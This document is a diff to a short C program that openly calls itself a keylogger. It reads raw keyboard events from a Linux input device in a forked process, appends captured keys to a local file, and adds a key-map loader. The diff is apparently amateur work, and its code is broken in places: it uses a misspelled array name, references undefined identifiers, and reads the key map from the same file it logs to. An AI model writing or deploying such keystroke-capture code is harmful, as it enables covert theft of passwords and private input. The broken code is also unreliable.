@@ -4,6 +4,10 @@
 #include <fcntl.h>
 #include <linux/input.h>
 
+
+char keys[242][20];
+
+
 main() {
 	printf("Starting keylogger\n");
 
@@ -36,12 +40,15 @@ main() {
 		if(fork() == 0) {
 			close(piped[0]);
 
+			load_key_map();
+
 			int file;
 			FILE *result;
 
 			printf("Iniciando keylogger (%d)\n", getpid());
 
 			file = open("/dev/input/event2", O_RDONLY);
+			result = fopen("./etc/keys.txt", "a+");
 
 			struct input_event ev;
 
@@ -50,12 +57,27 @@ main() {
 				if(ev.type == EV_KEY) {
 					if(ev.value == 1) {
 						//printf(" : [key %i]\n", ev.code);
-						result = fopen("./etc/keys.txt", "a+");
-						fputc(ev.code, result);
-						fclose(result);
+						fputc(key[ev.code], result);
+						fflush(result);
 					}
 				}
 			}
 		}
 	}
+}
+
+void load_key_map() {
+	FILE *kf = fopen("./etc/keys.txt", "r");
+	if(kf == NULL){ 
+		print_stamp();
+		fprintf(data, "ERROR : keys file missing\n");
+		exit(0);
+	}
+	char line[40];
+	int i;
+	for(i = 0; fgets(line, 30, kf) > 0 && i < 242; i++){
+		line[strlen(line) - 1] = '\0';
+		strcpy(keys[i], line);
+	}
+	fclose(kf);
 }
